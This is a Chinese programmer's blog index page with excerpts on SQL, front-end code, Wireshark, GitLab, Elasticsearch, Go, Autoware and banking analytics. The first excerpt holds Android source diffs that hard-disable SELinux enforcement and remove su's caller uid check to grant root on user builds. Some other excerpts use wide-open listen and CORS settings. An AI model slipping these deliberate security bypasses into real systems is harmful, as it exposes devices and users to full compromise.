<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b5a2e9430aa4b22e6d7085b984d5614/" rel="bookmark">
			Android ：user版本赋予su权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. userdebug和user版本
2. 关闭selinux
system/core
diff --git a/init/selinux.cpp b/init/selinux.cpp index 5a0255acd..787917274 100644 --- a/init/selinux.cpp +++ b/init/selinux.cpp @@ -104,6 +104,8 @@ EnforcingStatus StatusFromCmdline() { } bool IsEnforcing() { + return false; + if (ALLOW_PERMISSIVE_SELINUX) { return StatusFromCmdline() == SELINUX_ENFORCING; } 3. 修改su.cpp，注释用户组权限检测
system/extras/su/su.cpp
diff --git a/su/su.cpp b/su/su.cpp index 1a1ab6bf..af3d2a68 100644--- a/su/su.cpp +++ b/su/su.cpp @@ -80,8 +80,8 @@ void extract_uidgids(const char* uidgids, uid_t* uid, gid_t* gid, gid_t* gids, i } int main(int argc, char** argv) { - uid_t current_uid = getuid(); - if (current_uid !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b5a2e9430aa4b22e6d7085b984d5614/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/76629d04d814d85bb448cc1ca32cc9f7/" rel="bookmark">
			MySQL从重复的数据里筛选出最大的一条数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要求：这里要求从重复的user_id里筛选出vip_code最大的唯一 一条数据 , 如下图
SQL代码:
SELECT b.id,b.vip_code,b.user_id,b.price,b.end_date,b.create_time, (SELECT reimburse_award FROM t_vip_card WHERE id = b.vip_card_id) AS reimburseAward FROM t_vip_card_buy_records AS b JOIN ( SELECT max(vip_code) AS vip_code, user_id FROM t_vip_card_buy_records GROUP BY user_id ) AS a ON b.vip_code = a.vip_code AND b.user_id = a.user_id WHERE end_date &gt;= CURDATE() 运行效果:
总结：
这里一定要注意 max( ) 的结果一定是唯一的，比如上面的 end_date 和 create_time 就不是唯一的, 同一个user_id 有多条end_date和create_time相同数据 , 就只能用另外的方法来实现了
所以，这里用 max(vip_code) 配合 group by user_id 取出每个用户最大的 vip_code 那条数据，而这里每个 user_id 只会有一条 有效的 vip_code 最大的数据, 所以符合上面的写法
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23b5abbca18358b5c59e63b265132d66/" rel="bookmark">
			【HTML &#43; CSS】 实现原神纯静态官网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录
一、网页效果演示
二、poster code 2.1、html: &lt;!-- 页面一 --&gt;
&lt;div class="poster"&gt;
&lt;!-- 头部导航栏 --&gt;
&lt;div class="header_bar"&gt;
&lt;!-- 头部左边，logo --&gt;
&lt;div class="header_left"&gt;
&lt;!-- 音乐logo --&gt;
&lt;div class="musicLogo"&gt;
&lt;a href="###"&gt;
&lt;img src="img/MusicLogo.png"&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;!-- 原神logo --&gt;
&lt;div class="GenshinLogo"&gt;
&lt;img src="img/Genshin.png"/&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;!-- 横向导航栏 --&gt;
&lt;div class="header_navbar"&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href="###"&gt;首&amp;nbsp;页&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;a href="###"&gt;新&amp;nbsp;闻&lt;/a&gt; &lt;/li&gt;
&lt;li&gt;
&lt;a href="###"&gt;角&amp;nbsp;色&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;a href="###"&gt;世&amp;nbsp;界&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;a href="###"&gt;漫&amp;nbsp;画&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;a href="###"&gt;社&amp;nbsp;区&lt;/a&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23b5abbca18358b5c59e63b265132d66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfadacc1d24b0f0a33587bcbe88835de/" rel="bookmark">
			js读取json文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 原生的两种方法 1.1 XMLHttpRequest const xhr = new XMLHttpRequest(); xhr.overrideMimeType("application/json"); xhr.open('GET', 'data.json', true); xhr.onreadystatechange = function () { if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) { const data = JSON.parse(xhr.responseText); // 对象中的属性可以像平常一样访问 console.log(data); } }; xhr.send(null); 1.2 使用浏览器原生的fetch API fetch('data.json') .then(response =&gt; response.json()) .then(data =&gt; { // 在这里可以操作读取到的 JSON 数据对象 console.log(data); }) .catch(error =&gt; { // 处理错误情况 console.error('Error reading the JSON file:', error); }); 2. 引入库的方法 2.1 Axios &lt;script src="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfadacc1d24b0f0a33587bcbe88835de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7117c58e9d454f306abd816ba55579b3/" rel="bookmark">
			wireshark系列(三)-关于wireshark Time时间的显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 标准时间显示时间流 标准时间 这个选项显示的就是下图格式，也是最常用的
显示时间流 这个选项显示的就是下图格式，配合会话跟踪，会非常有用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9075847d50b3e2f12863b918e615201e/" rel="bookmark">
			wireshark系列(五)-根据滑动窗口过滤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 场景操作 场景 有时间需要分析滑动窗口tcp.window_size也就是看
[Calculated window size: 32768]字段
操作 随便找一个tcp数据包，然后打开头信息
选择[Calculated window size: 32768]选项
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb67d0e5748f338e4458845297016020/" rel="bookmark">
			uniapp开发ios跳转应用商店方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 //#ifdef APP-PLUS //在App Store Connect中的App Store下的app信息，可找到appleId uni.showModal({ title: "版本更新", content: '有新的版本发布，是否立即进行新版本下载？', confirmText: '立即更新', cancelText: '稍后进行', success: (res) =&gt; { if (res.confirm) { let appleId= 1625859925 plus.runtime.launchApplication({ action: `itms-apps://itunes.apple.com/cn/app/id${appleId}?mt=8` }, function(e) { console.log('Open system default browser failed: ' + e.message); }); } } }) //#endif 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf538577c15022f640f0376fd335300d/" rel="bookmark">
			主机dbeaver访问gitlab容器中的pg
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		映射5432端口- '5431:5432'或者从docker客户端查看 version: '3.6' services: web: image: 'gitlab/gitlab-ce:latest' restart: always hostname: 'localhost' environment: GITLAB_OMNIBUS_CONFIG: | external_url 'http://localhost:8929' gitlab_rails['gitlab_shell_ssh_port'] = 2224 ports: - '8929:8929' - '2224:22' - '5431:5432' volumes: - '/Users/yanlp/workspace/docker/gitlab_latest/config:/etc/gitlab' - '/Users/yanlp/workspace/docker/gitlab_latest/logs:/var/log/gitlab' - '/Users/yanlp/workspace/docker/gitlab_latest/data:/var/opt/gitlab' shm_size: '256m' 登陆容器修改postgresql配置docker exec -it 28e24039b4b6 /bin/bash 配置pg开启外部端口监听
$ vi /var/opt/gitlab/postgresql/data/postgresql.conf; #listen_addresses = '' 修改为 listen_addresses = '*' # what IP address(es) to listen on; 配置pg白名单
$ vi /var/opt/gitlab/postgresql/data/pg_hba.conf # TYPE DATABASE USER CIDR-ADDRESS METHOD # 最后一行追加 # "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf538577c15022f640f0376fd335300d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0441b7a7cc09ddc9d763684f03cd59f5/" rel="bookmark">
			hdc_std安装配置以及常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：（时间紧迫就别看前言了）hdc_std是OpenHarmony 的命令行工具。因为我们的鸿蒙系统没有应用商店、没有浏览器、不能外接usb设备以及打不开文件资源管理器，所以接触了hdc_std。
环境：Windows10电脑 工具：usb连接线、鸿蒙系统测试机
一、环境安装配置
1.新建一个文件夹并命名，作为存放hdc_std的路径，把.exe文件放到新建的文件夹中。
2.回到桌面，右击“此电脑”-&gt;点“属性”，点击高级系统设置，然后点环境变量。
3.在系统变量中找到Path，然后点编辑按钮。
4.把hdc_std.exe的路径复制一下，在编辑环境变量页面点“新建”，把路径粘贴到左侧，如图。
5.打开命令提示符（cmd），输入：hdc_std -v，如下图有版本号则成功。
二、常用命令（电脑USB已连接设备)
hdc_std start #启动hdc_std
hdc_std kill #关闭hdc_std
hdc_std start -r #重新启动hdc服务进程
hdc_std target boot #重启设备
hdc_std -h #查看帮助
OpenHarmony device connector(HDC) ... ---------------------------------global commands:---------------------------------- -h/help - Print hdc help -v/version - Print hdc version -l 0-5 - Set runtime loglevel -t connectkey - Use device with given connect key ---------------------------------component commands:------------------------------- session commands(on server): discover - Discover devices listening on TCP via LAN broadcast list targets [-v] - List all devices status, -v for detail tconn key - Connect device via key, TCP use ip:port example:192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0441b7a7cc09ddc9d763684f03cd59f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9f6de3471b4224f18e59c4edcc36696d/" rel="bookmark">
			SpringBoot使用ObjectMapper之Long和BigDemical类型的属性字符串处理，防止前端丢失数值精度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringBoot使用ObjectMapper之Long和BigDemical类型的属性字符串处理，防止前端丢失数值精度!
方式一：注解 使用注解 @JsonFormat(shape = JsonFormat.Shape.STRING)，如下：
import com.fasterxml.jackson.annotation.JsonFormat; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; import java.io.Serializable; import java.math.BigDecimal; @Data @NoArgsConstructor @AllArgsConstructor public class Demo implements Serializable { private static final long serialVersionUID = -2148559076064821626L; @JsonFormat(shape = JsonFormat.Shape.STRING) private Long id; @JsonFormat(shape = JsonFormat.Shape.STRING) private BigDecimal price; } 测试
@Autowired protected ObjectMapper objectMapper; @Test public void objectMapperTest() throws Exception { Demo demo = new Demo(Long.MAX_VALUE, new BigDecimal("12.34")); System.out.println(objectMapper.writeValueAsString(demo)); demo = objectMapper.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9f6de3471b4224f18e59c4edcc36696d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a15f3b383b8f3714407901d67fc49ca/" rel="bookmark">
			Autoware.universe部署06：使用DBC文件进行UDP的CAN通信代码编写
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录标题 一、安装DBC文件编辑工具VectorCANdb++二、编写DBC文件2.1 CAN通信协议2.2 编写DBC文件2.2.1 根据CAN协议设置signals2.2.2 设置报文2.2.3 建立节点 三、根据DBC文件编写ROS2驱动程序四、实际通信调试 根据CAN协议编写DBC文件，通过DBC文件编写ROS2包进行UDP通信，获取底盘速度转发至Autoware.Universe以及订阅Autoware.Universe控制命令，下发至CAN控制底盘运动（本文适用于CAN盒通过网线连接进行UDP通信），本系列其他文章：
Autoware.universe部署01：Ubuntu20.04安装Autoware.universe并与Awsim联调
Autoware.universe部署02：高精Lanelet2地图的绘制
Autoware.universe部署03：与Carla（二进制版）联调
Autoware.universe部署04：universe传感器ROS2驱动
Autoware.universe部署05：实车调试
一、安装DBC文件编辑工具VectorCANdb++ 在windows系统下安装VectorCANdb++，下载链接：https://www.vector.com/cn/zh/download/candb-31-sp3/
下载完成后常规安装，选择安装路径，其他过程一路Next：
安装完成后在左下角程序列表中可以找到
二、编写DBC文件 2.1 CAN通信协议 下面是松灵的HUNTER SE通信协议，是一款阿克曼模型可编程UGV（ UNMANNED GROUND VEHICLE ），它是一款采用阿克曼转向设计的底盘。下面只列举了三帧数据，每一帧数据包含一系列字节（例如：0x01, 0x11, 0x00,0x96, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00）的数据，我们需要注意的是每一帧数据的发送与接收节点，帧ID（例如：0x01, 0x11），数据长度，以及功能数据（例如：0x00,0x96, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00）：
2.2 编写DBC文件 有了通讯协议之后，打开VectorCANdb++，点击File-&gt;Create Database-&gt;CANTemplate.dbc后点击OK，创建文件名：
2.2.1 根据CAN协议设置signals 点击signals-&gt;new
以运动回馈帧的数据为例，根据上面的通讯协议数据帧包含8个字节byte，即8个信号signals，每个字节signals包含8个比特bit，协议中第3、4、5、6个字节没有定义数据，就默认为0，以速度高位为例：
Value Type高位选择有符号数据signed，低位选择无符号选择UnsignedLength（信号bit长度）8Factor（数据精度）一般为1Minimum与Maximum根据表格来填，表格是-4800～4800包含的是两位数据，这里单个信号是不一样的。协议中给出的是十六进制数，而这边的最大值最小值范围是十进制数，转化一下：如果是有符号的字节符号占一位，那么转化成十进制就是-127～127，如果是无符号的就是0～255。如果要遵守协议即-4800～4800，那么高位最好写成-18～18『（4800-256）/256=17.5』，写大一点没问题
按照协议写好所有的信号如下：
2.2.2 设置报文 在Messages下新建报文：注意帧ID以及数据字节数
之后建立报文与信号的关系，鼠标左键按住设置好的signals，拖动到新建的Messages上面，注意顺序要与协议文件中顺序一致
如果顺序错了，双击signals设置开始bit数可以更改
全都拖好了，双击新建的Messages，然后点击Layout，如下图所示，可以检查一下报文设置是否正确（图片上的字节顺序，从右至左，从上到下，依次增大）
2.2.3 建立节点 （1）建立发送和接受节点
右键点击Network nodes -&gt; New，只需输入创建的网络节点名字进行新建操作
（2）需要发送的报文直接拖到目标节点下的Tx Messages下面即可
（3）需要接收的报文添加：双击打开Receive，选择Mapped Rx Sig.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a15f3b383b8f3714407901d67fc49ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27e86d90da08213fe02c4746699cb39a/" rel="bookmark">
			前端js调取摄像头并实现拍照功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
最近接到的一个需求十分有意思，设计整体实现了前端仿 微信扫一扫 的功能。整理了一下思路，做一个分享。
tips: 如果想要实现完整扫一扫的功能，你需要掌握一些前置知识，这次我们先讲如何实现拍照并且保存的功能。
一. window.navigator 你想调取手机的摄像头，首先你得先检验当前设备是否有摄像设备，window 身上自带了一个 navigator 属性，这个对象有一个叫做 mediaDevices 的属性是我们即将用到的。
于是我们就可以先设计一个叫做 checkCamera 的函数，用来在页面刚开始加载的时候执行。。
我们先看一下这个对象有哪些方法，你也许会看到下面的场景，会发现这个属性身上只有一个值为 null 的 ondevicechange 属性，不要怕，真正要用的方法其实在它的原型身上。
让我们点开它的原型属性，注意下面这两个方法，这是我们本章节的主角。
我们到这一步只是需要判断当前设备是否有摄像头，我们先调取 enumerateDevices 函数来查看当前媒体设备是否存在。它的返回值是一个 promise 类型，我们直接用 async 和 await 来简化一下代码。
从上图可以看出，我的电脑有两个音频设备和一个视频设备，那么我们就可以放下进行下一步了。
二. 获取摄像头 接下来就需要用到上面提到的第二个函数，navigator.getUserMedia。这个函数接收一个对象作为参数，这个对象可以预设一些值，来作为我们请求摄像头的一些参数。
这里我们的重点是 facingMode 这个属性，因为我们扫一扫一般都是后置摄像头
当你执行了这个函数以后，你会看到浏览器有如下提示：
于是你高兴的点击了允许，却发现页面没有任何变化。
这里你需要知道，这个函数只是返回了一个媒体流信息给你，你可以这样简单理解刚刚我们干了什么，首先浏览器向手机申请我想用一下摄像头可以吗？在得到了你本人的确认以后，手机将摄像头的数据线递给了浏览器，：“诺，给你。”
但浏览器现在仅仅拿到了一根数据线，然而浏览器不知道需要将这个摄像头渲染到哪里，它不可能自动帮你接上这根线，你需要自己找地方接上这根数据线。
这里不卖关子，我们需要请到我们的 Video 标签。我没听错吧？那个播放视频的 video 标签？没错，就是原生的 video 标签。
这里创建一个 video 标签，然后打上 ref 来获取这个元素。
这里的关键点在于将流数据赋值给 video 标签的 srcObject 属性。就好像你拿到了数据线，插到了显示器上。
(tips: 这里需要特别注意，不是 video.src 而是 video.srcObject 请务必注意)
现在你应该会看到摄像头已经在屏幕上展示了。 三. 截取当前画面 当我按下按钮的时候，想办法将 video 标签当前的画面保存下来。在这个场景，我们需要用到 canvas 的一些能力。不要害怕，我目前对 canvas 的使用也不是特别熟练，今天也不会用到特别复杂的功能。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27e86d90da08213fe02c4746699cb39a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b58e375fd1acc906767665e201258ab/" rel="bookmark">
			Elasticsearch7开启x-pack验证
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Elasticsearch7.X，x-pack已经作为默认的插件集成在Elasticsearch里面了，所以无需在bin/elasticsearch-plugin install x-pack了，直接在配置文件中启用就可以了
[root@localhost bin]# ./elasticsearch-plugin install x-pack ERROR: this distribution of Elasticsearch contains X-Pack by default 开启x-pack 参考官方文档，开启x-pack只需要在elasticsearch的配置文件elasticsearch.yml文件中新增如下配置即可：
# 开启x-pack安全验证
# 配置X-Pack
http.cors.enabled: true
http.cors.allow-origin: "*"
http.cors.allow-headers: Authorization
xpack.security.enabled: true
xpack.security.audit.enabled: true
xpack.license.self_generated.type: basic
# 如果是basic license的话需要加入下面这一行，不然的话restart elasticsearch之后会报错。
xpack.security.transport.ssl.enabled: true
设置密码
[root@host-172-16-200-6 bin]# ./elasticsearch-setup-passwords interactive
warning: usage of JAVA_HOME is deprecated, use ES_JAVA_HOME
Future versions of Elasticsearch will require Java 11; your Java version from [/usr/jdk1.8.0_241/jre] does not meet this requirement.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6b58e375fd1acc906767665e201258ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf3e0767296e660c456d3d86c171ce54/" rel="bookmark">
			http get 请求 参数数组类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当在HTTP GET请求中传递数数组类型的参数时，需要按照一定的格式进行编码。并且具体的格式可能会根据后端的实现和预期的格式进行变化。这里有两种常见的方法：
方法一：相同参数名，多次出现
在URL中，后面每一个数组元素都用相同的参数名。例如，如果你有一个名为 value 的数组，其值为 [1,2,3]，那么URL可能为:
http://example.com/api?value=1&amp;value=2&amp;value=3
方法二：使用[]在参数名后面表示数组
在URL中，使用方括号 [] 表示数组。例如，如果你有一个名为 value 的数组，其值为 [1,2,3]，那么URL可能为:
http://example.com/api?value[]=1&amp;value[]=2&amp;value[]=3
这两种方法都有广泛的支持，但应当注意的是，不同的服务可能会对这些方式支持不同，具体应当参考你正在使用的API或后端服务的文档。
特别提醒
对于在请求参数中有数组或者map这种复杂类型的传参，最好用 post 类型，这样传参方便些，只需要把参数放到 body 里就行。遇到坑点的场景是springboot中API验签AOP中统一接收参数GET数组原生方法会自动转为逗号隔分的字符串。
原文链接：https://blog.csdn.net/qq_41767116/article/details/133641499
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3cc43404bef9d38d50c125e0d0d18f3/" rel="bookmark">
			[媒体]js上传视频图片格式对应的原生type判断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 视频格式：
wmv: video/x-ms-wmvrm: application/vnd.rn-realmediamov: video/quicktimempeg: video/mpegmp4: video/mp43gp: video/3gppflv: video/x-flvavi: video/x-msvideormvb: application/vnd.rn-realmedia-vbrts: video/mp2tasf: video/x-ms-asfmpg: video/mpegwebm: video/webmmkv: video/x-matroskam3u8: application/x-mpegURLwm: video/x-ms-wmasx: video/x-ms-asfram: audio/x-pn-realaudiompe: video/mpegvob: video/dvddat: video/dvdmp4v: video/mp4v-esm4v: video/x-m4vf4v: video/x-f4vmxf: application/mxfqt: video/quicktimeogg: video/ogg, application/ogg 图片格式：
JPG和JPEG（Joint Photographic Experts Group）：.jpg 或 .jpeg
对应的JavaScript类型：image/jpegPNG（Portable Network Graphics）：.png
对应的JavaScript类型：image/pngGIF（Graphics Interchange Format）：.gif
对应的JavaScript类型：image/gifSVG（Scalable Vector Graphics）：.svg
对应的JavaScript类型：image/svg+xmlTIFF（Tagged Image File Format）：.tif 或 .tiff
对应的JavaScript类型：image/tiffBMP（Bitmap Image File）：.bmp
对应的JavaScript类型：image/bmpPSD（Adobe Photoshop Document）：.psd
对应的JavaScript类型：image/vnd.adobe.photoshopICO（Icon）：.ico
对应的JavaScript类型：image/x-iconCR2（Canon Raw）：.cr2
对应的JavaScript类型：image/x-canon-cr2DNG（Digital Negative）：.dng
对应的JavaScript类型：image/x-adobe-dng 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/793c6803e334193e5758f0147e8f6fce/" rel="bookmark">
			在 go 的项目中使用验证器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1：使用validate 包验证：
安装包： go get github.com/go-playground/validator/v10
package controller import ( "fmt" "github.com/gin-gonic/gin" "github.com/go-playground/validator/v10" "net/http" ) // 使用 type OrderController struct 来区别同一个包下面出现相同的func 函数 type OrderController struct { } //获取搜索的参数 type Order struct { Id int `json:"id" validate:"required"` // 使用validate 的包进行验证 Name string `json:"name" validate:"required"` OrderId int `json:"orderId" validate:"required"` Email string `json:"email" validate:"email"` } type Search struct { Cid int `json:"cid"` Name string `json:"name"` } func (o OrderController) GetList(c *gin.Context) { v := validator.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/793c6803e334193e5758f0147e8f6fce/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/570c7167f759820e1ac39882f4e696a0/" rel="bookmark">
			银行业数据分析算法应用汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据分析在银行业的应用及具体案例 一、欺诈检测二、客户细分三、风险建模四、营销优化五、信用评分六、客户流失预测七、推荐引擎八、客户生命周期价值预测 一、欺诈检测 欺诈检测即通过分析交易模式，检测可能的欺诈行为，主要有以下几个方面
1.跨机构开户数量核验机制和风险信息共享机制：建立这些机制可以增加更多维度的风险标签共享和使用，提升联防联控效果。
2.异常账户、可疑交易等大数据风控模型：借助外部共享数据，进一步完善这些风控模型，持续提升检测效果。
3.警银联动：配合公安部门建立完善电信网络诈骗涉案资金即时查询、紧急止付、快速冻结、及时解冻和资金返还制度、程序和救济措施。
4.知识图谱：以全行用户（借记卡、信用卡、信贷）为客群，利用历史全量或一定时间范围内的转账、雇佣、IP、设备等20余种关系数据构建全量图谱，每日识别全量客户团伙欺诈风险。
5反欺诈系统：反欺诈系统主要进行实时欺诈交易检测和阻断。客户在APP或者网银提交交易请求，该请求将经过一系列数据字段补充，形成完整的交易报文，反欺诈系统实时取出交易报文并进行风险评估，将风险评估情况和对应控制措施返回给网银系统，网银系统进行实际控制。
案例
信用卡欺诈是传统金融行业的范畴，信用卡企债行为包括利用信用卡透支消费的特点，以非法占有为目的，经发卡银行催收后仍不归还透支款或者在大量透支后潜逃隐瞒身份、以逃避还款责任的行为。出现信用卡被欺诈使用的情况通常有几下几种：卡不在场：欺诈者通过盗取卡和人的相关信息（卡号、有效期、姓名）进行交易；卡被伪造：通过一定设备读取真实磁条卡的信息，并伪造信用卡；卡丢失或被盗：持卡人在挂失前被欺诈使用；身份信息被盗：欺诈分子通过盗取电话账单、水电费账单、银行对账单等信息，以他人名义申请信用卡；卡邮寄被盗：信用卡在邮寄过程中被盗。
在信用卡欺诈检测中，有多种算法可以使用，以下是一些常见算法：
①逻辑回归：逻辑回归是一个非常经典的分类算法，其思路非常简单：通过 Sigmoid 函数将线性回归得到的预测值映射到区间（0，1）上，根据映射值的大小和设定的阈值便可以进行分类。
②支持向量机（SVM）：SVM分类器的集合提供了很高的检测率。
③随机森林：随机森林具有最低的误报率。
④基于对抗学习的动态模型：这种方法使用博弈论对抗学习方法来模拟欺诈者的最佳策略，并先发制人地调整欺诈检测系统，提升其应对潜在威胁的能力。
⑤神经网络：神经网络可以学习可疑的模式以及检测类别和集群以使用这些模式进行欺诈检测。
具体案例例如：DF,CCF大数据竞赛案例
数据集：信用卡欺诈检测数据集 - DF,CCF大数据竞赛数据；数据集包含2013年9月由欧洲持卡人通过信用卡进行的交易，包括信用卡交易的金额、时间、金额等信息；
数据大小：284807行*31列
字段说明：共31个字段，其中V1-V28是经过PCA转换后的数据（数字变量），Time交易时间以秒为单位，Amount交易金额，Class是交易类型（在欺诈情况为1，否则为0）
二、客户细分 通过分析客户的行为、收入、信用等级等因素，将客户分为不同的群体，以便更好地理解他们的需求和行为，主要有以下几类算法。
①K-Means聚类算法：K-Means聚类算法是一种常用的无监督学习算法，用于将客户划分为不同的群体。这种方法计算量比较小，适用于大数据。
②层次聚类法：层次聚类法也可以用于客户细分，但它更适用于小数据。
③基于人口特征和行为特征的相关变量分析：选取人口特征和行为特征的相关变量进行数据挖掘，得出个案的聚类结果和变量的聚类结果。
④机器学习算法：近几年，机器学习算法在银行的应用越来越广，分类、聚类、关联等都可能用到，也会用到神经网络、深度学习、图算法等。
其中聚类分析为主流的应用算法，具体案例见上文超链接。
三、风险建模 风险的识别和评估是投资银行关注的问题，为了规范不同的金融活动并为各种金融工具确定合适的价格，通过分析历史数据，预测贷款违约、欺诈等风险，帮助银行做出更好的决策。
风险管理中的数据分析算法主要包括以下几种：
①数据仓库建立：首先收集大数据，整合大数据，清洗大数据，建立一个合理的数据仓库。
②规则和模型建立：利用数据仓库建立规则和模型，用于风险管理，实现利益最大化，风险最小化。
③随机森林：设计能衡量属性值的相似度以及差异度的基本指标，然后在带有真实标签的记录对集合上，以这些基本指标为输入特征，通过生成单边随机森林来获得具有可解释性、高区分度和高覆盖率的规则，得到的规则即风险特征。
基于历史购买保险的客户数据，进行有监督的机器学习，搭建保险推荐模型，并出具应用策略，配合营销模型给业务部门推送营销方案。德勤法国进行的有关PD建模的案例研究发现，多项模型表现指标均表明，使用随机森林、梯度提升和堆叠法在构建PD模型中优于逻辑回归模型。在适当的条件下，在模型估计中采用机器学习方法很大可能会提高模型的准确性。不过，机器学习在提升模型准确性的同时，通常亦会令模型变得难以解释。
一个案例例如SAS风险管理工具，通过监管风险，资本规划，信用风险管理，风险监控等业务，建立风险意识，优化资本和流动性，满足监管要求。
项目数据：通过将历史损失数据与财务报表数据代入新标准计量法的公式，金融机构即可完成其操作风险最低资本需求的计算。
四、营销优化 营销优化即通过分析客户的购买历史、响应行为等，优化营销策略，提高营销效果，帮助银行更好地理解客户需求，预测市场趋势，制定并实施有效的营销策略。以下是一些在银行业营销优化中常用的数据分析算法：
①分类算法：如决策树、随机森林和支持向量机等，这些算法可以帮助银行对客户进行分群，从而针对不同类型的客户制定合适的营销策略。
②聚类算法：如K-means和层次聚类等，这些算法可以帮助银行对客户进行细分，识别出相似的客户群体，以便进行更精细化的营销。
③关联规则学习：关联规则学习如Apriori、FP-Growth等算法可以帮助银行发现客户购买行为之间的关联性，从而设计交叉销售和组合推荐等营销策略。
④回归分析算法：如线性回归、逻辑回归和支持向量回归等，这些算法可以帮助银行预测客户的购买意愿和购买力，从而调整产品定价和优惠策略。
